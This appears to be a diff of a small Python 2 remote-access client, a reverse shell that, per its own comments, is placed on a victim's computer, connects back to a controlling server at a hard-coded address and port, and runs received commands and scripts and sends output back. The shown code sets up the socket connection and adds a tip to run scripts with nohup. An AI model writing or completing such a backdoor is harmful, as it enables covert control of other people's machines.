@@ -3,9 +3,10 @@
 # Hackers would put on cd and run and connects to server
 
 # Once running, connect to server, just wait for instructions
-# Run commands, and send back output to server
+# Run commands, scripts and send back output to server
 # So controlling someone else's computer
 
+# For running script, use nohup at beginning 
 
 import os  
 import subprocess
@@ -14,14 +15,13 @@ import json
 
 from subprocess import check_output
 
-
 # To get home directory
 from os.path import expanduser
 
 def connectToServer():	
 	s = socket.socket()         # Create a socket object
 	#host = socket.gethostname() # IP Address of server
-	host = '192.168.0.9' #confirmed is this: 192.168.0.12, temp for now: 192.168.0.9
+	host = '192.168.0.9' #confirmed for now: 192.168.0.9, Network is: 99.247.19.83
 	port = 9999                # Port of server
 	print "Trying to connect to: {} at {}".format(host, port)
 	s.connect((host, port))
